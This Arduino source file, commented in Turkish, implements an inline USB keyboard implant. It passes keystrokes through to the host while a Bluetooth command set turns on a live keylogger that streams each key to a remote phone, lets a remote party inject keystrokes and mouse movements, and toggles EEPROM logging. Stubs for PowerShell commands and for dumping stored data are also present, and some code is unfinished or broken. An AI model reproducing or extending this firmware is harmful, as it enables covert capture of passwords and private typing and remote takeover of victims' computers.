#include <hidboot.h>
#include <usbhub.h>
#include <Keyboard.h>
#include <SoftwareSerial.h>

//mouse
#include <Mouse.h>

// Satisfy the IDE, which needs to see the include statment in the ino too.
#ifdef dobogusinclude
#include <spi4teensy3.h>
#include <SPI.h>
#endif

//eeprom
#include <Wire.h>
#define disk1 0x50

#define leftCtrl KEY_LEFT_CTRL
#define rightCtrl KEY_RIGHT_CTRL
#define leftAlt KEY_LEFT_ALT
#define rightAlt KEY_RIGHT_ALT
#define leftGUI KEY_LEFT_GUI
#define rightGUI KEY_RIGHT_GUI
#define leftShift KEY_LEFT_SHIFT
#define rightShift KEY_RIGHT_SHIFT

#define ESC KEY_ESC
#define TAB KEY_TAB
#define backSpace KEY_BACKSPACE
#define returnKey KEY_RETURN

#define arrowUp KEY_UP_ARROW
#define arrowDown KEY_DOWN_ARROW
#define arrowLeft KEY_LEFT_ARROW
#define arrowRight KEY_RIGHT_ARROW

#define homeKey KEY_HOME
#define endKey KEY_END
#define insert KEY_INSERT
#define pageUp KEY_PAGE_UP
#define deleteKey KEY_DELETE
#define pageDown KEY_PAGE_DOWN

#define F1 KEY_F1
#define F2 KEY_F2
#define F3 KEY_F3
#define F4 KEY_F4
#define F5 KEY_F5
#define F6 KEY_F6
#define F7 KEY_F7
#define F8 KEY_F8
#define F9 KEY_F9
#define F10 KEY_F10
#define F11 KEY_F11
#define F12 KEY_F12

#define bluetoothTx 11
#define bluetoothRx 8

SoftwareSerial BT_1(bluetoothTx, bluetoothRx);

//BLUETOOTH
char input_byteData;
String printed;
boolean blueCommit = 0;
boolean blueKeyboard = 0;
boolean blueKeylogger = 0;
boolean blueKeyIn = 0; // eger normal tusa basilmissa 1 olur
boolean blueMouse = 0;

//MOUSE
int cspd = 10;//curser speed

boolean tut = 1; // eger normal veya ozel bir tusa basildiysa 0, parmagimizi cektiysek 1
char keyes;

char lastButton;

boolean special_tut = 0; // 0 ise ozel tusa basili tutulmuyor 1 ise ozel tusa basili tutuluyor
char specialChar;
uint8_t keyesSpecial;

int controlStop = 0;

int controlKey; // 0-ctrl 1-shift 2-alt 3-gui  // simdilik bir ise yaramiyor

int controlKeyChecked = 0; // iki kez calisan fonksiyon icin

int shiftControl = 0;
int ctrlControl = 0;
int altControl = 0;
int guiControl = 0;

int eskiZaman = 0;
int yeniZaman;

int SPECIAL_eskiZaman = 0;
int SPECIAL_yeniZaman;

boolean right_ctrlEnabled;
boolean right_altEnabled;
boolean right_shiftEnabled;
boolean right_guiEnabled;

boolean left_ctrlEnabled;
boolean left_altEnabled;
boolean left_shiftEnabled;
boolean left_guiEnabled;

int pastKeyChecked = 0;

int specialKapa = 0;

boolean combinePress = 0;

//eeprom
byte adressEnd;
int _adressEnd;
boolean is_EEPROM_open; // 0 -> kapali // 1 -> acik

class KbdRptParser : public KeyboardReportParser
{
    void PrintKey(uint8_t mod, uint8_t key);
    void OnControlKeysChanged(uint8_t before, uint8_t after);
    void OnKeyDown	(uint8_t mod, uint8_t key);
    void OnKeyUp	(uint8_t mod, uint8_t key);
    void OnKeyboard(uint8_t key);
    void OnCtrl();
    void OnAlt();
    void OnShift();
    void OnGui();
    void OnSpecial(uint8_t key);
    void OnSpecialKey(uint8_t key);
    void OnKeyPressed(uint8_t key);

};

void KbdRptParser::PrintKey(uint8_t m, uint8_t key)
{
  MODIFIERKEYS mod;
  *((uint8_t*)&mod) = m;
  Serial.print((mod.bmLeftCtrl   == 1) ? "C" : " ");
  Serial.print((mod.bmLeftShift  == 1) ? "S" : " ");
  Serial.print((mod.bmLeftAlt    == 1) ? "A" : " ");
  Serial.print((mod.bmLeftGUI    == 1) ? "G" : " ");

  Serial.print(" >");
  PrintHex<uint8_t>(key, 0x80);
  Serial.print("< ");

  Serial.print((mod.bmRightCtrl   == 1) ? "C" : " ");
  Serial.print((mod.bmRightShift  == 1) ? "S" : " ");
  Serial.print((mod.bmRightAlt    == 1) ? "A" : " ");
  Serial.println((mod.bmRightGUI    == 1) ? "G" : " ");

};

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key)
{

  tut = 0;
  eskiZaman = millis();
  OnSpecial(key); // ozel tus kontrolu ve yazdirilmasi
  Serial.print("DN ");
  PrintKey(mod, key);
  uint8_t c = OemToAscii(mod, key);
  keyes = (char)c; // seri yazdirirken kullanilan tus degiskeni

  if (c)
    OnKeyPressed(c);

  lastButton = keyes;


}


void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) { // bu fonksiyon iki kez calisiyor, ilk bastigimda ikincisi elimi cektigimde

  MODIFIERKEYS beforeMod;
  *((uint8_t*)&beforeMod) = before;

  MODIFIERKEYS afterMod;
  *((uint8_t*)&afterMod) = after;

  controlKeyChecked++;
  Serial.println(controlKeyChecked); // 1 basili tutuluyor 2 parmak cekildi


  if (beforeMod.bmLeftCtrl != afterMod.bmLeftCtrl) {
    Serial.println("LeftCtrl changed");
    OnCtrl();
    left_ctrlEnabled = 1;
    controlKey = 0;
    ctrlControl++; // tusa basilmissa 1 parmak cekilmisse 2 olur
  }
  if (beforeMod.bmLeftShift != afterMod.bmLeftShift) {
    Serial.println("LeftShift changed");
    OnShift();
    left_shiftEnabled = 1;
    controlKey = 1;
    shiftControl++;
    //controlKeyChecked = 0; // shift haliahzirda calistigi icin bu kod burada
  }
  if (beforeMod.bmLeftAlt != afterMod.bmLeftAlt) {
    Serial.println("LeftAlt changed");
    OnAlt();
    left_altEnabled = 1;
    controlKey = 2;
    altControl++;
  }
  if (beforeMod.bmLeftGUI != afterMod.bmLeftGUI) {
    Serial.println("LeftGUI changed");
    OnGui();
    left_guiEnabled = 1;
    controlKey = 3;
    guiControl++;
  }

  if (beforeMod.bmRightCtrl != afterMod.bmRightCtrl) {
    Serial.println("RightCtrl changed");
    OnCtrl();
    right_ctrlEnabled = 1;
    controlKey = 0;
    ctrlControl++;
  }
  if (beforeMod.bmRightShift != afterMod.bmRightShift) {
    Serial.println("RightShift changed");
    OnShift();
    right_shiftEnabled = 1;
    controlKey = 1;
    shiftControl++;
    //controlKeyChecked = 0; // shift haliahzirda calistigi icin bu kod burada
  }
  if (beforeMod.bmRightAlt != afterMod.bmRightAlt) {
    Serial.println("RightAlt changed");
    OnAlt();
    right_altEnabled = 1;
    controlKey = 2;
    altControl++;
  }
  if (beforeMod.bmRightGUI != afterMod.bmRightGUI) {
    Serial.println("RightGUI changed");
    OnGui();
    right_guiEnabled = 1;
    controlKey = 3;
    guiControl++;
  }

}

void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key)
{
  tut = 1;
  Serial.print("UP ");
  PrintKey(mod, key);
  eskiZaman = yeniZaman; // tustan parmagimizi cektin time tutmayi durdur

  if (key == 40 || key == 41 || key == 42 || key == 43 || key == 58 || key == 59 || key == 60 || key == 61 || key == 62 || key == 63 || key == 64 || key == 65 || key == 66 || key == 67 || key == 68 || key == 69 || key == 73 || key == 74 || key == 75 || key == 76 || key == 77 || key == 78 || key == 79 || key == 80 || key == 81 || key == 82 || key == 88) {
    special_tut = 0; //ozel tus basimi durdu

    SPECIAL_eskiZaman = SPECIAL_yeniZaman;
    Keyboard.release(specialChar);
  }

  lastButton;
}

void KbdRptParser::OnKeyboard(uint8_t key)
{
  if (controlKeyChecked == 0) //eger ctrl-gui-alt-shift vs bir tusa basili tutuluyorsa calistirma // cunku orjinal klavyelerde ctrl gibi tusa basili tutuluyorken normal tus press olmaz
  {
    Keyboard.print((char)key);
    //delay(20); // tusa basildiktan sonra bekle
  }

}

void KbdRptParser::OnCtrl() {

  if (left_ctrlEnabled == 1) {
    Keyboard.write(leftCtrl);
  }
  else if (right_ctrlEnabled == 1) {
    Keyboard.write(rightCtrl);
  }
}

void KbdRptParser::OnAlt() {

  if (left_altEnabled == 1) {
    Keyboard.write(leftAlt);
  }
  else if (right_altEnabled == 1) {
    Keyboard.write(rightAlt);
  }
}

void KbdRptParser::OnShift() {

  if (left_shiftEnabled == 1) {
    Keyboard.write(leftShift);
  }
  else if (right_shiftEnabled == 1) {
    Keyboard.write(rightShift);
  }
}

void KbdRptParser::OnGui() {

  if (left_guiEnabled == 1) {
    Keyboard.write(leftGUI);
  }
  else if (right_guiEnabled == 1) {
    Keyboard.write(rightGUI);
  }
}

// tanimlanan keyleri dizi sekline getirmeye calis ki OnSpecial fonksiyonu icine for dongusu sokup surekli yenilenen kodlari kucultup alan kazan

void KbdRptParser::OnSpecial(uint8_t key)
{

  if (key == 40 || key == 41 || key == 42 || key == 43 || key == 58 || key == 59 || key == 60 || key == 61 || key == 62 || key == 63 || key == 64 || key == 65 || key == 66 || key == 67 || key == 68 || key == 69 || key == 73 || key == 74 || key == 75 || key == 76 || key == 77 || key == 78 || key == 79 || key == 80 || key == 81 || key == 82 || key == 88)
  {
    keyesSpecial = key; // loop icinde kullanabilmek icin
    special_tut = 1; // ozel tusa basildi
    OnSpecialKey(key);

    SPECIAL_eskiZaman = millis();

    if (controlKeyChecked == 0 || (pastKeyChecked == 2 && controlKeyChecked == 1)) // ya kombinasyon yokken yada hem varken ve tus kombinasyonu daha oncesinden yapilmisken
      // buradaki controlKeyChecked == 1 ifadesi gereksiz olabilir cunku zaten pastKeyChecked ifadesi == 2 bunun olamsiyla oluyor
    {

      switch (key) // ozel tus kontrolu ve yazdirilmasi
      {
        case 40: Keyboard.write(returnKey); break;
        case 41: Keyboard.write(ESC); break;
        case 42: Keyboard.write(backSpace); break;
        case 43: Keyboard.write(TAB); break;
        case 58: Keyboard.write(F1); break;
        case 59: Keyboard.write(F2); break;
        case 60: Keyboard.write(F3); break;
        case 61: Keyboard.write(F4); break;
        case 62: Keyboard.write(F5); break;
        case 63: Keyboard.write(F6); break;
        case 64: Keyboard.write(F7); break;
        case 65: Keyboard.write(F8); break;
        case 66: Keyboard.write(F9); break;
        case 67: Keyboard.write(F10); break;
        case 68: Keyboard.write(F11); break;
        case 69: Keyboard.write(F12); break;
        case 73: Keyboard.write(insert); break;
        case 74: Keyboard.write(homeKey); break;
        case 75: Keyboard.write(pageUp); break;
        case 76: Keyboard.write(deleteKey); break;
        case 77: Keyboard.write(endKey); break;
        case 78: Keyboard.write(pageDown); break;
        case 79: Keyboard.write(arrowRight); break;
        case 80: Keyboard.write(arrowLeft); break;
        case 81: Keyboard.write(arrowDown); break;
        case 82: Keyboard.write(arrowUp); break;
        case 88: Keyboard.write(returnKey); break;
      }

    }
  }
}

void KbdRptParser::OnSpecialKey(uint8_t key)
{
  switch (key)
  {
    case 40: specialChar = returnKey; break;
    case 41: specialChar = ESC; break;
    case 42: specialChar = backSpace; break;
    case 43: specialChar = TAB; break;
    case 58: specialChar = F1; break;
    case 59: specialChar = F2; break;
    case 60: specialChar = F3; break;
    case 61: specialChar = F4; break;
    case 62: specialChar = F5; break;
    case 63: specialChar = F6; break;
    case 64: specialChar = F7; break;
    case 65: specialChar = F8; break;
    case 66: specialChar = F9; break;
    case 67: specialChar = F10; break;
    case 68: specialChar = F11; break;
    case 69: specialChar = F12; break;
    case 73: specialChar = insert; break;
    case 74: specialChar = homeKey; break;
    case 75: specialChar = pageUp; break;
    case 76: specialChar = deleteKey; break;
    case 77: specialChar = endKey; break;
    case 78: specialChar = pageDown; break;
    case 79: specialChar = arrowRight; break;
    case 80: specialChar = arrowLeft; break;
    case 81: specialChar = arrowDown; break;
    case 82: specialChar = arrowUp; break;
    case 88: specialChar = returnKey; break;
  }
}


void KbdRptParser::OnKeyPressed(uint8_t key)
{
  Serial.print("ASCII: ");
  Serial.println((char)key);
  OnKeyboard((char)key);
  blueKeyIn = 1;

};

USB     Usb;
//USBHub     Hub(&Usb);
HIDBoot<USB_HID_PROTOCOL_KEYBOARD>    HidKeyboard(&Usb);

uint32_t next_time;

KbdRptParser Prs;

void setup()
{

  Serial.begin( 115200 );
  BT_1.begin(9600);
  Keyboard.begin();
  Wire.begin();

  unsigned int address = 0;

  is_EEPROM_open = readEEPROM(disk1, 0);

  pinMode(4, INPUT_PULLUP);

#if !defined(__MIPSEL__)
  while (Serial); // (while (!Serial))Wait for serial port to connect - used on Leonardo, Teensy and other boards with built-in USB CDC serial connection
#endif

  Serial.println("Start");

  if (Usb.Init() == -1)
    Serial.println("OSC did znot start.");

  delay( 200 );

  next_time = millis() + 5000;

  HidKeyboard.SetReportParser(0, &Prs);
}

void loop() {

  Usb.Task();

  //const char *msg = "hello";

  if (tut == 0) {
    yeniZaman = millis();  // tusa basilirsa zamani kaydet
  }

  if (special_tut == 1) {
    SPECIAL_yeniZaman = millis();  // ozel tusa basilirsa zamani kaydet
  }

  bluetoothData();
  bluetoothCommit();
  liveKeylogger();
  normalKeyWrite();
  specialKeyWrite();
  combineKeyWrite();
  fingerUp();
  combineElse();

}

void bluetoothData() {

  if (BT_1.available() > 0) { // eger bluetooth iletisimi varsa
    input_byteData = BT_1.read();//recieve value from bluetooth
    printed += input_byteData;

    if (input_byteData == '#') { printed = ""; }
                 
    if (printed == "$") {

      blueKeyboard = 0;
      blueMouse = 0;
      blueKeylogger = 0; //live
      blueKeyIn = 0; //liveClose
      printed = "";  
      }
    
    blueCommit = 1;

    if (input_byteData != '#' && blueKeyboard == 1) { keyboardWrite(); } // BLUETOOTH KEYBOARD

    if (input_byteData != '#' && blueMouse == 1) { mouseWrite(); } // BLUETOOTH MOUSE

    if (digitalRead(4) == 0) { delay(1000); Serial.println(printed); }
  }
}

void bluetoothCommit() 
{

  if (blueCommit == 1) 
  {

    if (printed == "KEYBOARDOPEN") { blueKeyboard = 1; } // bluetooth ile klavye kontrolu icin gerekli kodlar

    if (printed == "MOUSEOPEN") { blueMouse = 1; } // bluetooth ile fare kontrol etmek icin gerekli kodlar.

    if (printed == "LIVEKEYLOGGEROPEN") { blueKeyIn = 0; blueKeylogger = 1; } // bluetooth keylogger ozelligi icin gerekli kodlar.

    if (printed == "LIVEKEYLOGGEROPENCLOSEEEPROM") {} // bluetooth keylogger ozelligi, eeprom kaydediyorsa eger duracak

    if (printed == "POWERSHELLOPEN") {} // bluetooth poweshell komutlarini kullanabilmek icin gerekli kodlar

    if (printed == "EEPROMCHECK") { if(readEEPROM(disk1, 0) == 0) { BT_1.print("EEPROMISCLOSE"); } else if(readEEPROM(disk1, 0) == 1) { BT_1.print("EEPROMISOPEN"); } }
                                    
    if (printed == "EEPROMDATACHECK") { adressEnd = readEEPROM(disk1, 1); _adressEnd = (int) ((65536 - adressEnd - 2) * 100)/65536; BT_1.print(_adressEnd); }

    if (printed == "EEPROMSTART") { writeEEPROM(disk1, 0, 1); is_EEPROM_open = 1; } // eeprom ozelligini acmak icin gerekli kelime

    if (printed == "EEPROMSTOP") { writeEEPROM(disk1, 0, 0); is_EEPROM_open = 0; } // eeprom ozelligini kapamak icin gerekli kelime

    if (printed == "GETEEPROMDATA") {} // eeprom icinde kayitli datayi bluetooth ustunden gondermek icin bekleyen kelime 
 }

  blueCommit = 0;
}

void liveKeylogger() 
{

  if (blueKeylogger == 1 && blueKeyIn == 1) {

    BT_1.print(lastButton);

    blueKeyIn = 0;
  }
}

void keyboardWrite() 
{

  if (blueCommit == 1) {
    Keyboard.print(input_byteData); //print char as recieved byte by byte
    blueCommit = 0;
  }

}

void mouseWrite() 
{
  /*here we configure our code to recive spacifide val from the
        adapter and act accordingly
        some apps give you abilty to send any char you want and
        others give you pre specifide char
        OR IN BETTER CASES, you can create your own app with android :D*/
  if (input_byteData == "UP") {
    Mouse.move(0, -cspd, 0);//move up
  }
  if (input_byteData == "DOWN") {
    Mouse.move(0, cspd, 0);//move down
  }
  if (input_byteData == "RIGHT") {
    Mouse.move(cspd, 0, 0);//move right
  }
  if (input_byteData == "LEFT") {
    Mouse.move(-cspd, 0, 0);//move left
  }

  // if you want to move Diagonally you should use the commented code
  //but you mus make sure that your app has such option

  if (input_byteData == "UPLEFT") {
    Mouse.move(-cspd, -cspd, 0);//move up left
  }
  if (input_byteData == "UPRIGHT") {
    Mouse.move(cspd, -cspd, 0);//move up right
  }
  if (input_byteData == "DOWNLEFT") {
    Mouse.move(-cspd, cspd, 0);//move down left
  }
  if (input_byteData == "DOWNRIGH") {
    Mouse.move(cspd, cspd, 0);//move down right
  }

  if (input_byteData == "MIDDLE") {
    Mouse.click(MOUSE_MIDDLE);

    /* this instruction make a mouse click with the left mouse button
       we can set the mouse button th click-- Mouse.click(button);
       Button= MOUSE_LEFT(defult) | MOUSE_RIGHT | MOUSE_MIDDLE */
  }

  if (input_byteData == "RIGHTCLICK") {
    Mouse.click(MOUSE_RIGHT);//Right click
  }
  if (input_byteData == "PRESS") {
    Mouse.press();//Left click, aka. Press
  }
  if (input_byteData == "PREESSUP") {
    Mouse.release();//release a pressed button. It can be set to other buttons
  }
}


void normalKeyWrite() 
{

  if (yeniZaman - eskiZaman > 1300 && tut == 0 && controlKeyChecked == 0) { // normal tuslarin seri yazdirilmasi, controlKeyChecked == 0 yani kombinasyon tusuna basiliyorsa donguyu calistirma
    Keyboard.print(keyes);
    delay(35);
  }
}

void specialKeyWrite() 
{

  if (SPECIAL_yeniZaman - SPECIAL_eskiZaman > 1300 && tut == 0 && special_tut == 1 && controlKeyChecked == 0) { // special_tut == 1 yani ozel tusa basilmis f1,f2,f3,tab,enter,home gibi, ozel tus bu sekilde seri yazdirilir
    Keyboard.press(specialChar);                                                                                // controlKeyChecked == 0 yani kombinasyon tusuna basiliyorsa donguyu calistirma
  }
}

void combineKeyWrite() 
{

  if (ctrlControl == 1 && (special_tut == 1 || tut == 0)) {
    if (left_ctrlEnabled == 1) {
      Keyboard.press(leftCtrl);
    }
    else if (right_ctrlEnabled == 1) {
      Keyboard.press(rightCtrl);
    }
  }

  if (altControl == 1 && (special_tut == 1 || tut == 0)) {
    if (left_altEnabled == 1) {
      Keyboard.press(leftAlt);
    }
    else if (right_altEnabled == 1) {
      Keyboard.press(rightAlt);
    }
  }

  if (shiftControl == 1 && (special_tut == 1 || tut == 0)) {
    if (left_shiftEnabled == 1) {
      Keyboard.press(leftShift);
    }
    else if (right_shiftEnabled == 1) {
      Keyboard.press(rightShift);
    }
  }

  if (guiControl == 1 && (special_tut == 1 || tut == 0)) {
    if (left_guiEnabled == 1) {
      Keyboard.press(leftGUI);
    }
    else if (right_guiEnabled == 1) {
      Keyboard.press(rightGUI);
    }
  }

}

void fingerUp() 
{

  if (controlKeyChecked == 2) { // ctrl - shift - alt - gui tuslarindan parmagimizi cektik

    controlKey = 4; // 0 ctrl 1 shift 2 alt 3 gui 4 null
    controlKeyChecked = 0; // OnControlKeysChanged fonksiyonunun tekrar donebilmesi icin gerekli
    pastKeyChecked = 0;
    specialKapa = 0;
  }

  if (ctrlControl == 2) { // ctrl tusundan parmagimizi cektik

    ctrlControl = 0; // tekrar icin gerekli
    left_ctrlEnabled = 0;
    right_ctrlEnabled = 0;
    Keyboard.release(leftCtrl);
    Keyboard.release(rightCtrl);
  }

  if (altControl == 2) { // alt tusundan parmagimizi cektik

    altControl  = 0; // tekrar icin gerekli
    left_altEnabled = 0;
    right_altEnabled = 0;
    Keyboard.release(leftAlt);
    Keyboard.release(rightAlt);
  }

  if (shiftControl == 2) { // shift tusundan parmagimizi cektik

    shiftControl = 0; // tekrar icin gerekli
    left_shiftEnabled = 0;
    right_shiftEnabled = 0;
    Keyboard.release(leftShift);
    Keyboard.release(rightShift);
  }

  if (guiControl == 2) { // gui tusundan parmagimizi cektik

    guiControl = 0; // tekrar icin gerekli
    left_guiEnabled = 0;
    right_guiEnabled = 0;
    Keyboard.release(leftGUI);
    Keyboard.release(rightGUI);
  }

  // kombinasyon icin bastigimiz normal tustan parmagimizi cektik
  if (((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && tut == 1) || ((ctrlControl == 0 || altControl == 0 || shiftControl == 0 || guiControl == 0) && tut == 1)) {

    Keyboard.release(lastButton);
  }

  // kombinasyon icin bastigimiz ozel tustan parmagimizi cektik
  if ((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && special_tut == 1  || ((ctrlControl == 0 || altControl == 0 || shiftControl == 0 || guiControl == 0) && special_tut == 1)) {

    Keyboard.release(specialChar);
  }

}

void combineElse() 
{

  if ((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && tut == 0 && combinePress == 0)  { // burasi hatali, ilk basimda eski lastbutton geliyor

    Keyboard.press(lastButton);
    Serial.println(lastButton);
    combinePress = 1;
    delay(45);
  }

  if ((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && special_tut == 1 && SPECIAL_yeniZaman - SPECIAL_eskiZaman > 500) {

    Keyboard.press(specialChar);
    Serial.println(specialChar);
    delay(25);
  }

  // special tusla kombinasyon yapakerken ctrl vs. ilk basimda 300milisaniye bekletmek icin
  if ((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && special_tut == 1 && specialKapa == 0) {

    Keyboard.print(specialChar);
    Serial.println(specialChar);
    delay(300);
    specialKapa = 1;
  }

  // eger kombinasyon tusuna  basili tutuluyor ve herhangi bir ozel veya normal tusa basiliyorsa
  if (controlKeyChecked == 1 && (tut == 0 || special_tut == 1)) {
    pastKeyChecked = 1;  // normal veya ozel tusa combinasyonla basilmissa = 1 ex/. ctrl + z
  }

  // normal veya ozel tusa kombinasyonlar bastik ama sonra normal veya ozel tusa basmayi kestik ama kombiansyon tusuan hala basili tutuyoruz
  if (pastKeyChecked == 1 && (tut == 1 && special_tut == 0) && controlKeyChecked == 1) {
    pastKeyChecked = 2;
    combinePress = 0;
  }
}

void writeEEPROM(int deviceaddress, unsigned int eeaddress, byte data )
{
  Wire.beginTransmission(deviceaddress);
  Wire.write((int)(eeaddress >> 8));   // MSB
  Wire.write((int)(eeaddress & 0xFF)); // LSB
  Wire.write(data);
  Wire.endTransmission();

  delay(5);
}

byte readEEPROM(int deviceaddress, unsigned int eeaddress )
{
  byte rdata = 0xFF;

  Wire.beginTransmission(deviceaddress);
  Wire.write((int)(eeaddress >> 8));   // MSB
  Wire.write((int)(eeaddress & 0xFF)); // LSB
  Wire.endTransmission();

  Wire.requestFrom(deviceaddress, 1);

  if (Wire.available()) rdata = Wire.read();

  return rdata;
}

